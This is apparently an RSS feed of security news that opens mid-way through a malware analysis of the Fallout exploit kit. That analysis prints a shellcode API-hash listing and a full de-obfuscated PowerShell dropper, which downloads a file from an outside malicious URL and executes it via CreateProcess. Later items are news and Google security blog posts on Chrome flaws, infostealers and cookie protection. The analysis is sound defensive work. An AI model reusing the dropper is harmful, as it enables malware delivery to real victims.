ShellcodeHashSearcher: 0x000007cd: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007de: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
ShellcodeHashSearcher: 0x00000685: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000693: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a5: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b8: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006c9: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006d9: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006ea: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fb: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070c: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071d: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000777: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000786: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x00000799: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007aa: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bb: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cc: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007dd: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
</code></pre></div></div>

<p>The final encoded PowerShell script is downloaded, decoded and executed.</p>

<h2 id="powershell">PowerShell</h2>

<pre><code class="language-ps1">Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct lI111
{
    public IntPtr llIll;
    public IntPtr II1ll1I1;
    public uint llllIlI;
    public uint l1l1l;
}

[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct lI1I1l1l
{
    public uint lI1lI1I;
    public string l1l1II1;
    public string llIlI1;
    public string IlIl1l;
    public uint ll1llI11;
    public uint ll1l11I1;
    public uint IlI11lI;
    public uint IIlIll1I;
    public uint IIl1II;
    public uint I11Il;
    public uint IIIIII;
    public uint l1IlIll;
    public short llI11l1;
    public short llll1I11;
    public IntPtr I1llIIlI;
    public IntPtr Il1I11lI;
    public IntPtr llllll;
    public IntPtr lI1l1I1I;
};

public static class I1l11lIl
{
    [DllImport(""kernel32.dll"",SetLastError=true)]
    public static extern bool CreateProcess(string I1l1Il1I,string l1111,IntPtr lllI111,IntPtr I111IIlI,bool lllll,uint III1l1l1,IntPtr l1l1l11l,string lIll1111,ref lI1I1l1l l111l,out lI111 I1111l1);
}
"@;

$lIlI1 = "$env:userprofile\AppData\LocalLow\$(-join((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})).tmp";
$Il11l = 'https://not-my-guilty.com/04_10_1971/beaveries/aoer.phtml';

$cli = (New-Object Net.WebClient);
$cli.Headers['User-Agent'] = 'pqqyW56Fe8W2G7m3';
$cli.DownloadFile($Il11l, $lIlI1);

$llII11l = New-Object lI1I1l1l;
$llII11l.llI11l1 = 0x0;
$llII11l.lI1lI1I = [System.Runtime.InteropServices.Marshal]::SizeOf($llII11l);
$I1111111 = New-Object lI111;
[I1l11lIl]::CreateProcess($lIlI1, $lIlI1, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000008, [IntPtr]::Zero, "c:", [ref]$llII11l, [ref]$I1111111)|out-null;
</code></pre>

<p>This PowerShell code downloads the malware and calls CreateProcess. At this time, User-Agent is not common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/02.png" /></p>

<h2 id="finally">Finally</h2>
<p>Fallout has also evolved. Analysis has become more difficult than before. You should keep an eye on Fallout in the future.</p>
]]></content:encoded>
<pubDate>2019-03-06T15:00:00+00:00</pubDate>
</item>
<item>
<title>Google Addresses Tenth Zero-Day in Chrome This Year - WinBuzzer</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/27/google-addresses-tenth-zero-day-in-chrome-this-year-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1t036MLesemfHNhNcLI4Dr</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/27/google-addresses-tenth-zero-day-in-chrome-this-year-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1t036MLesemfHNhNcLI4Dr</guid>
<content:encoded><![CDATA[
In an ongoing battle against security exploits, Google has patched the tenth zero-day <b>vulnerability</b> in Chrome this year. ... <b>macOS</b>, along with version&nbsp;...
]]></content:encoded>
<pubDate>2024-08-27T14:00:02Z</pubDate>
</item>
<item>
<title>Google Warns of Exploited Chrome Vulnerability</title>
<link>https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/</link>
<guid>https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/</guid>
<content:encoded><![CDATA[
<p>Google flags another high-severity vulnerability patched with the latest Chrome 128 release as exploited in the wild.</p>
<p>The post <a href="https://www.securityweek.com/google-warns-of-exploited-chrome-vulnerability/">Google Warns of Exploited Chrome Vulnerability</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 08:58:53 +0000</pubDate>
</item>
<item>
<title>New Styx Stealer Malware Targets Browsers and Instant Messaging for Data Theft</title>
<link>https://www.cysecurity.news/2024/08/new-styx-stealer-malware-targets.html</link>
<guid>https://www.cysecurity.news/2024/08/new-styx-stealer-malware-targets.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div style="text-align: justify;"><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2cs1e52c2zZX_kEEBVYJx6SW7nHbWCgvA_C3YS0RDLwZnV7CM6sViUxYQFMzQhH6Bt3M0winQRK0csAATRO1QA2kY25Xs4a6EIjcqnW32pt172h3gD1AiioGphJITok1gX0w_ZJEw_rVFVpQtntBg0mdHwNbenSq8RStUtFPBArUmwOrq8VPECnGnKoM/s1280/hacker-1944688_1280.jpg" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2cs1e52c2zZX_kEEBVYJx6SW7nHbWCgvA_C3YS0RDLwZnV7CM6sViUxYQFMzQhH6Bt3M0winQRK0csAATRO1QA2kY25Xs4a6EIjcqnW32pt172h3gD1AiioGphJITok1gX0w_ZJEw_rVFVpQtntBg0mdHwNbenSq8RStUtFPBArUmwOrq8VPECnGnKoM/s600/hacker-1944688_1280.jpg" width="600" /></a></div>A new malware strain known as Styx Stealer has recently emerged, posing a significant threat to online security. Discovered in April 2024, Styx Stealer primarily targets popular browsers based on the Chromium and Gecko engines, such as Chrome and Firefox. The malware is designed to pilfer a wide range of sensitive information from these browsers, including saved passwords, cookies, auto-fill data (which may include credit card details), cryptocurrency wallet information, system data like hardware specifics, external IP addresses, and even screenshots.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The implications of such a broad data theft capability are alarming, as the stolen information could be used for identity theft, financial fraud, or even more targeted cyberattacks.

Styx Stealer doesn’t stop at browsers. It also targets widely used instant messaging applications like Telegram and Discord. By compromising these platforms, the malware can gain access to users’ chats, potentially exposing sensitive conversations. This further exacerbates the threat, as the attackers could exploit this data to compromise the victim’s online identity or carry out social engineering attacks.

The origins of Styx Stealer trace back to a Turkish cybercriminal who operates under the alias “Sty1x.” The malware is sold through Telegram or a dedicated website, with prices ranging from $75 per month to $350 for unlimited access.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Interestingly, the malware’s discovery was aided by a critical mistake made by its developer. During the debugging process, the developer failed to implement proper operational security (OpSec) measures, inadvertently leaking sensitive data from their own computer to security researchers. This blunder not only exposed details about Styx Stealer’s capabilities and targets but also revealed the developer’s earnings and their connection to another notorious malware strain, Agent Tesla.

Further forensic analysis uncovered a link between Sty1x and a Nigerian threat actor known by aliases such as Fucosreal and Mack_Sant. This individual had previously been involved in a campaign using Agent Tesla malware to target Chinese firms in various sectors.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The connection between these two cybercriminals suggests potential collaboration, making Styx Stealer an even more formidable threat.

Styx Stealer appears to be a derivative of the Phemedrone Stealer malware, inheriting core functionalities while introducing enhancements like auto-start and crypto-clipping features. These improvements make Styx Stealer more dangerous, increasing its potential to cause significant financial harm to its victims.

The discovery of Styx Stealer highlights the ongoing evolution of cyber threats. Although the leak by the developer has likely disrupted Styx Stealer’s initial operations, it’s crucial to remain vigilant as cybercriminals adapt quickly.</div>
]]></content:encoded>
<pubDate>2024-08-25T11:03:46.174-04:00</pubDate>
</item>
<item>
<title>Google Warns of CVE-2024-7965 Chrome Security Flaw Under Active Exploitation</title>
<link>https://thehackernews.com/2024/08/google-warns-of-cve-2024-7965-chrome.html</link>
<guid>https://thehackernews.com/2024/08/google-warns-of-cve-2024-7965-chrome.html</guid>
<content:encoded><![CDATA[
Google has revealed that a security flaw that was patched as part of a software update rolled out last week to its Chrome browser has come under active exploitation in the wild.
Tracked as CVE-2024-7965, the vulnerability has been described as an inappropriate implementation bug in the V8 JavaScript and WebAssembly engine.
"Inappropriate implementation in V8 in Google Chrome prior to
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 10:15:00 +0530</pubDate>
</item>
<item>
<title>New Qilin Ransomware Attack Uses VPN Credentials, Steals Chrome Data</title>
<link>https://thehackernews.com/2024/08/new-qilin-ransomware-attack-uses-vpn.html</link>
<guid>https://thehackernews.com/2024/08/new-qilin-ransomware-attack-uses-vpn.html</guid>
<content:encoded><![CDATA[
The threat actors behind a recently observed Qilin ransomware attack have stolen credentials stored in Google Chrome browsers on a small set of compromised endpoints.
The use of credential harvesting in connection with a ransomware infection marks an unusual twist, and one that could have cascading consequences, cybersecurity firm Sophos said in a Thursday report.
The attack, detected in July
]]></content:encoded>
<pubDate>Fri, 23 Aug 2024 15:54:00 +0530</pubDate>
</item>
<item>
<title>Google Fixes High-Severity Chrome Flaw Actively Exploited in the Wild</title>
<link>https://thehackernews.com/2024/08/google-fixes-high-severity-chrome-flaw.html</link>
<guid>https://thehackernews.com/2024/08/google-fixes-high-severity-chrome-flaw.html</guid>
<content:encoded><![CDATA[
Google has rolled out security fixes to address a high-severity security flaw in its Chrome browser that it said has come under active exploitation in the wild.
Tracked as CVE-2024-7971, the vulnerability has been described as a type confusion bug in the V8 JavaScript and WebAssembly engine.
"Type confusion in V8 in Google Chrome prior to 128.0.6613.84 allowed a remote attacker to exploit heap
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 10:49:00 +0530</pubDate>
</item>
<item>
<title>Exploiting XSS in hidden inputs and meta tags</title>
<link>https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags</link>
<guid>https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags</guid>
<content:encoded><![CDATA[
In this post we are going to show how you can (ab)use the new HTML popup functionality in Chrome to exploit XSS in meta tags and hidden inputs. It all started when I noticed the new popover behaviour
]]></content:encoded>
<pubDate>Tue, 11 Jul 2023 13:00:00 GMT</pubDate>
</item>
<item>
<title>The curl quirk that exposed Burp Suite &amp;amp; Google Chrome</title>
<link>https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome</link>
<guid>https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome</guid>
<content:encoded><![CDATA[
In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both Burp Suite Pro, and Google Chrome. We patched Burp Suite a while back, but suspect
]]></content:encoded>
<pubDate>Tue, 28 Mar 2023 13:13:51 GMT</pubDate>
</item>
<item>
<title>Using Hackability to uncover a Chrome infoleak</title>
<link>https://portswigger.net/research/using-hackability-to-uncover-a-chrome-infoleak</link>
<guid>https://portswigger.net/research/using-hackability-to-uncover-a-chrome-infoleak</guid>
<content:encoded><![CDATA[
I've been hacking browsers for over 15 years and one of the challenges I set myself was to find a SOP bypass or info leak in every major browser. Chrome was the last browser standing…until now. This p
]]></content:encoded>
<pubDate>Thu, 01 Sep 2022 13:00:00 GMT</pubDate>
</item>
<item>
<title>Framing without iframes</title>
<link>https://portswigger.net/research/framing-without-iframes</link>
<guid>https://portswigger.net/research/framing-without-iframes</guid>
<content:encoded><![CDATA[
Whilst testing for XSS vectors, we found some new ways of framing a web site that don't use the iframe element. Naturally, we've updated our XSS cheat sheet to document them. We discovered that Chrome
]]></content:encoded>
<pubDate>Wed, 27 Jul 2022 14:57:48 GMT</pubDate>
</item>
<item>
<title>Post-Quantum Cryptography: Standards and Progress</title>
<link>http://security.googleblog.com/2024/08/post-quantum-cryptography-standards.html</link>
<guid>http://security.googleblog.com/2024/08/post-quantum-cryptography-standards.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Royal Hansen, VP, Privacy, Safety and Security Engineering, Google, and Phil Venables, VP, TI Security & CISO, Google Cloud</span>

<p>
The National Institute of Standards and Technology (NIST) just released three finalized standards for post-quantum cryptography (PQC) covering public key encapsulation and two forms of digital signatures. In progress since 2016, this achievement represents a major milestone towards standards development that will keep information on the Internet secure and confidential for many years to come. 
</p>
<p>
Here's a brief overview of what PQC is, how Google is using PQC, and how other organizations can adopt these new standards. You can also read more about PQC and Google's role in the standardization process <a href="https://cloud.google.com/blog/products/identity-security/how-google-is-preparing-for-a-post-quantum-world/?e=48754805">in this 2022 post from Cloud CISO Phil Venables</a>.
</p>
<h2>What is PQC?</h2>


<p>
Encryption is central to keeping information confidential and secure on the Internet. Today, most Internet sessions in modern browsers are encrypted to prevent anyone from eavesdropping or altering the data in transit. Digital signatures are also crucial to online trust, from code signing proving that programs haven't been tampered with, to signals that can be relied on for confirming online identity.
</p>
<p>
Modern encryption technologies are secure because the computing power required to "crack the code" is very large; larger than any computer in existence today or the foreseeable future. Unfortunately, that's an advantage that won't last forever. Practical large-scale <a href="https://quantumai.google/discover/whatisqc">quantum computers</a> are still years away, but computer scientists <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm">have known for decades</a> that a cryptographically relevant quantum computer (CRQC) could break existing forms of asymmetric key cryptography.
</p>
<p>
PQC is the effort to defend against that risk, by defining standards and collaboratively implementing new algorithms that will resist attacks by both classical and quantum computers.
</p>
<p>
You don't need a quantum computer to use post-quantum cryptography, or to prepare. All of the standards released by NIST today run on the classical computers we currently use.
</p>
<h2>How is encryption at risk?</h2>


<p>
While a CRQC doesn't exist yet, devices and data from today will still be relevant in future. Some risks are already here:
</p>
<ul>

<li><strong>Stored Data</strong> Through an attack known as <em>Store Now, Decrypt Later</em>, encrypted data captured and saved by attackers is stored for later decryption, with the help of as-yet unbuilt quantum computers

<li><strong>Hardware Products</strong> Defenders must ensure that future attackers cannot forge a digital signature and implant compromised firmware, or software updates, on pre-quantum devices that are still in use
</li>
</ul>
<p>
For more information on CRQC-related risks, see our <a href="https://bughunters.google.com/blog/5108747984306176/google-s-threat-model-for-post-quantum-cryptography">PQC Threat Model post</a>.
</p>
<h2>How can organizations prepare for PQC migrations?</h2>


<p>
Migrating to new cryptographic algorithms is often a slow process, even when weaknesses affect widely-used crypto systems, because of organizational and logistical challenges in fully completing the transition to new technologies. For example, NIST deprecated SHA-1 hashing algorithms in 2011 and recommends complete phase-out by 2030.
</p>
<p>
That’s why it's crucial to take steps now to improve organizational preparedness, independent of PQC, with the goal of making your transition to PQC easier.
</p>
<p>
These <em>crypto agility</em> best practices can be enacted anytime:
</p>
<ul>

<li><strong>Cryptographic inventory</strong> Understanding where and how organizations are using cryptography includes knowing what cryptographic algorithms are in use, and critically, managing key material safely and securely 

<li><strong>Key rotation</strong> Any new cryptographic system will require the ability to generate new keys and move them to production without causing outages. Just like testing recovery from backups, regularly testing key rotation should be part of any good resilience plan

<li><strong>Abstraction layers</strong> You can use a tool like <a href="https://developers.google.com/tink">Tink, Google's multi-language, cross-platform open source library</a>, designed to make it easy for non-specialists to use cryptography safely, and to switch between cryptographic algorithms without extensive code refactoring

<li><strong>End-to-end testing</strong> PQC algorithms have different properties. Notably, public keys, ciphertexts, and signatures are significantly larger. Ensure that all layers of the stack function as expected
</li>
</ul>
<p>
Our <a href="https://www.nature.com/articles/s41586-022-04623-2">2022 paper "Transitioning organizations to post-quantum cryptography"</a> provides additional recommendations to help organizations prepare and this <a href="https://bughunters.google.com/blog/6182336647790592/cryptographic-agility-and-key-rotation">recent post from the Google Security Blog</a> has more detail on cryptographic agility and key rotation.
</p>
<h2>Google's PQC Commitments</h2>


<p>
Google takes these risks seriously, and is taking steps on multiple fronts. Google began <a href="https://security.googleblog.com/2016/07/experimenting-with-post-quantum.html">testing PQC in Chrome in 2016</a> and has been <a href="https://cloud.google.com/blog/products/identity-security/why-google-now-uses-post-quantum-cryptography-for-internal-comms?e=48754805">using PQC to protect internal communications</a> since 2022. In May 2024, <a href="https://blog.chromium.org/2024/05/advancing-our-amazing-bet-on-asymmetric.html">Chrome enabled ML-KEM by default</a> for TLS 1.3 and QUIC on desktop. ML-KEM is also enabled on Google servers. Connections between Chrome Desktop and Google's products, such as Cloud Console or Gmail, are already experimentally protected with post-quantum key exchange.
</p>
<p>
Google engineers have contributed to the standards released by NIST, as well as <a href="https://www.iso.org/standard/80492.html">standards created by ISO</a>, and have submitted Internet Drafts to the IETF for <a href="https://www.google.com/url?q=https://datatracker.ietf.org/doc/draft-davidben-tls-trust-expr/&amp;sa=D&amp;source=docs&amp;ust=1719337176044717&amp;usg=AOvVaw1GculUbK3_3Hgsv6w-VE-q">Trust Expressions</a>, <a href="https://www.google.com/url?q=https://datatracker.ietf.org/doc/draft-davidben-tls-merkle-tree-certs/&amp;sa=D&amp;source=docs&amp;ust=1719337176044781&amp;usg=AOvVaw1S2vxLo4QsJsIuaTIYmUy8">Merkle Tree Certificates</a>, and <a href="https://datatracker.ietf.org/doc/draft-wiggers-hbs-state/">managing state for hash-based signatures</a>. <a href="https://developers.google.com/tink">Tink</a>, Google's open source library that provides secure and easy-to-use cryptographic APIs, already provides experimental PQC algorithms in C++, and our engineers are working with partners to produce formally verified PQC implementations that can be used at Google, and beyond. 
</p>
<p>
As we make progress on our own PQC transition, Google will continue to provide PQC updates on Google services, with updates to come from Android, Chrome, Cloud, and others.
</p>
]]></content:encoded>
<pubDate>2024-08-13T10:00:07.223-04:00</pubDate>
</item>
<item>
<title>Improving the security of Chrome cookies on Windows</title>
<link>http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html</link>
<guid>http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Will Harris, Chrome Security Team</span>

<p>
Cybercriminals using cookie theft <a href="https://cloud.google.com/blog/products/identity-security/a-year-in-the-cybersecurity-trenches-with-mandiant-managed-defense">infostealer</a> malware continue to pose a risk to the safety and security of our users. We already have a number of initiatives in this area including <a href="https://security.googleblog.com/2024/07/building-security-into-redesigned.html">Chrome’s download protection</a> using Safe Browsing, <a href="https://blog.chromium.org/2024/04/fighting-cookie-theft-using-device.html">Device Bound Session Credentials</a>, and Google’s account-based threat detection to flag the use of stolen cookies. Today, we’re announcing another layer of protection to make Windows users safer from this type of malware.
</p>
<p>
Like other software that needs to store secrets, Chrome currently secures sensitive data like cookies and passwords using the strongest techniques the OS makes available to us - on macOS this is the <a href="https://developer.apple.com/documentation/security/keychain_services/">Keychain services</a>, and on Linux we use a system provided wallet such as kwallet or gnome-libsecret. On Windows, Chrome uses the Data Protection API (DPAPI) which protects the data at rest from other users on the system or cold boot attacks. However, the DPAPI does not protect against malicious applications able to execute code as the logged in user - which infostealers take advantage of.
</p>
<p>
In Chrome 127 we are introducing a new protection on Windows that improves on the DPAPI by providing <strong>Application-Bound (App-Bound) </strong>Encryption primitives. Rather than allowing any app running as the logged in user to access this data, Chrome can now encrypt data tied to app identity, similar to how the Keychain operates on macOS.
</p>
<p>
We will be migrating each type of secret to this new system starting with cookies in Chrome 127. In future releases we intend to expand this protection to passwords, payment data, and other persistent authentication tokens, further protecting users from infostealer malware.
</p>
<p>
<strong>How it works</strong>
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpjkAClX2VvgsIhLi2zAmvRwVMPEeJqUhqisKHIKxbfGAwh8p8-V7Ixct5azzn_jYfJYo2izWnGcbkVh3cabbCLVQQQsJAJagvFPCFJsx4MibauJqnLVymQYdhdGGc53q3wSJSeTPQ6vyxXosJ-tJRKuaaoV7_J_E2KB9glSZ1m3NSEwEBj-duevgROHlM/s1416/Screenshot%202024-07-26%202.15.06%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpjkAClX2VvgsIhLi2zAmvRwVMPEeJqUhqisKHIKxbfGAwh8p8-V7Ixct5azzn_jYfJYo2izWnGcbkVh3cabbCLVQQQsJAJagvFPCFJsx4MibauJqnLVymQYdhdGGc53q3wSJSeTPQ6vyxXosJ-tJRKuaaoV7_J_E2KB9glSZ1m3NSEwEBj-duevgROHlM/s16000/Screenshot%202024-07-26%202.15.06%20PM.png" /></a></div><p>
App-Bound Encryption relies on a privileged service to verify the identity of the requesting application. During encryption, the App-Bound Encryption service encodes the app's identity into the encrypted data, and then verifies this is valid when decryption is attempted. If another app on the system tries to decrypt the same data, it will fail.
</p>
<p>
Because the App-Bound service is running with system privileges, attackers need to do more than just coax a user into running a malicious app. Now, the malware has to gain system privileges, or inject code into Chrome, something that legitimate software shouldn't be doing. This makes their actions more suspicious to antivirus software – and more likely to be detected. Our other recent initiatives such as providing <a href="https://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html">event logs</a> for cookie decryption work in tandem with this protection, with the goal of further increasing the cost and risk of detection to attackers attempting to steal user data.
</p>
<p>
<strong>Enterprise Considerations</strong>
</p>
<p>
Since malware can bypass this protection by running elevated, enterprise environments that do not grant their users the ability to run downloaded files as Administrator are particularly helped by this protection - malware cannot simply request elevation privilege in these environments and is forced to use techniques such as injection that can be more easily detected by endpoint agents.
</p>
<p>
App-Bound Encryption strongly binds the encryption key to the machine, so will not function correctly in environments where Chrome profiles roam between multiple machines. We encourage enterprises who wish to support roaming profiles to follow current <a href="https://support.google.com/chrome/a/answer/7349337">best practices</a>. If it becomes necessary, App-Bound encryption can be configured using the new <a href="https://chromeenterprise.google/policies/#ApplicationBoundEncryptionEnabled">ApplicationBoundEncryptionEnabled</a> policy.
</p>
<p>
To further help detect any incompatibilities, Chrome emits an event when a failed verification occurs. The Event is ID 257 from 'Chrome' source in the Application log.
</p>
<p>
<strong>Conclusion</strong>
</p>
<p>
App-Bound Encryption increases the cost of data theft to attackers and also makes their actions far noisier on the system. It helps defenders draw a clear line in the sand for what is acceptable behavior for other apps on the system. As the malware landscape continually evolves we are keen to continue engaging with others in the security community on improving detections and strengthening operating system protections, such as stronger app isolation primitives, for any bypasses.
</p>
]]></content:encoded>
<pubDate>2024-07-30T13:02:03.926-04:00</pubDate>
</item>
<item>
<title>Building security into the redesigned Chrome downloads experience</title>
<link>http://security.googleblog.com/2024/07/building-security-into-redesigned.html</link>
<guid>http://security.googleblog.com/2024/07/building-security-into-redesigned.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Jasika Bawa, Lily Chen, and Daniel Rubery, Chrome Security</span>

<p>
Last year, we introduced a <a href="https://blog.chromium.org/2023/08/redesigning-chrome-downloads-to-keep.html">redesign</a> of the Chrome downloads experience on desktop to make it easier for users to interact with recent downloads. At the time, we mentioned that the additional space and more flexible UI of the new Chrome downloads experience would give us new opportunities to make sure users stay safe when downloading files. 
</p>
<p>
<strong>Adding context and consistency to download warnings</strong>
</p>
<p>
The redesigned Chrome downloads experience gives us the opportunity to provide even more context when Chrome protects a user from a <a href="https://support.google.com/chrome/answer/6261569">potentially malicious file</a>. Taking advantage of the additional space available in the new downloads UI, we have replaced our previous warning messages with more detailed ones that convey more nuance about the nature of the danger and can help users make more informed decisions.
</p>

<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gQhfi9Adg__U7OfrbECy8i7-lZIrptsdyyahf0H2Ky5geMifkcYWAxdmNifsoRZiXn4uN5Ybgq2ycO0ZGEmajqLYEjRb5fH52Mw9-swQCxJ5cv67zEt133yYJh651bS5YpUDG9LcAyC5PwG-ZvL1fO2tFXwS91Q5c9V20ms70V6DWe1TJamrZc-NmTid/s2000/RedesignedWarning_inline_7.10.24_V3.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gQhfi9Adg__U7OfrbECy8i7-lZIrptsdyyahf0H2Ky5geMifkcYWAxdmNifsoRZiXn4uN5Ybgq2ycO0ZGEmajqLYEjRb5fH52Mw9-swQCxJ5cv67zEt133yYJh651bS5YpUDG9LcAyC5PwG-ZvL1fO2tFXwS91Q5c9V20ms70V6DWe1TJamrZc-NmTid/s16000/RedesignedWarning_inline_7.10.24_V3.png" /></a></div><p style="text-align: center;">
<em>Our legacy, space-constrained warning vs. our redesigned one</em>
</p>
<p style="text-align: left;">
We also made download warnings more understandable by introducing a two-tier download warning taxonomy based on AI-powered malware verdicts from <a href="https://safebrowsing.google.com/">Google Safe Browsing</a>. These are: 
</p>
<ol>

<li>Suspicious files (lower confidence verdict, unknown risk of user harm)

</li><li>Dangerous files (high confidence verdict, high risk of user harm)
</li>
</ol>
<p>
These two tiers of warnings are distinguished by iconography, color, and text, to make it easy for users to quickly and confidently make the best choice for themselves based on the nature of the danger and Safe Browsing's level of certainty. Overall, these improvements in clarity and consistency have resulted in significant changes in user behavior, including fewer warnings bypassed, warnings heeded more quickly, and all in all, better protection from malicious downloads.
</p><p style="text-align: center;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPtYz0ba59W8_Orn_Q_viwJ_brTwqLTlZeGwUPAO0IRmuyKWSv4Fxr6Fb34UfBJzHAT0Ydok7JdnPb26t7GxRQD3whlixXbqzrfuFlKYs8DsuH1_Zd3QieU1-RyrGODIrWzJavG-PH0uBchqOFTT51Wgea8uLxTFD_2XHIBy3Vmw77nOmbOIbuqmNq4jOC/s1080/SuspiciousAndDangerous_inline_V2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPtYz0ba59W8_Orn_Q_viwJ_brTwqLTlZeGwUPAO0IRmuyKWSv4Fxr6Fb34UfBJzHAT0Ydok7JdnPb26t7GxRQD3whlixXbqzrfuFlKYs8DsuH1_Zd3QieU1-RyrGODIrWzJavG-PH0uBchqOFTT51Wgea8uLxTFD_2XHIBy3Vmw77nOmbOIbuqmNq4jOC/s16000/SuspiciousAndDangerous_inline_V2.png" /></a></div><p></p><p style="text-align: center;">
<em>Differentiation between suspicious and dangerous warnings</em>
</p>
<p style="text-align: left;">
<strong>Protecting more downloads with automatic deep scans</strong>
</p>
<p>
Users who have opted-in to the <a href="https://support.google.com/chrome/answer/9890866">Enhanced Protection</a> mode of Safe Browsing in Chrome are prompted to send the contents of suspicious files to Safe Browsing for deep scanning before opening the file. Suspicious files are a small fraction of overall downloads, and file contents are only scanned for security purposes and are deleted shortly after a verdict is returned.
</p>
<p>
We've found these additional scans to have been extraordinarily successful – they help catch brand new malware that Safe Browsing has not seen before and dangerous files hosted on brand new sites. In fact, <strong>files sent for deep scanning are over 50x more likely to be flagged as malware</strong> than downloads in the aggregate.
</p>
<p>
Since Enhanced Protection users have already agreed to send a small fraction of their downloads to Safe Browsing for security purposes in order to benefit from additional protections, we recently moved towards automatic deep scans for these users rather than prompting each time. This will protect users from risky downloads while reducing user friction.
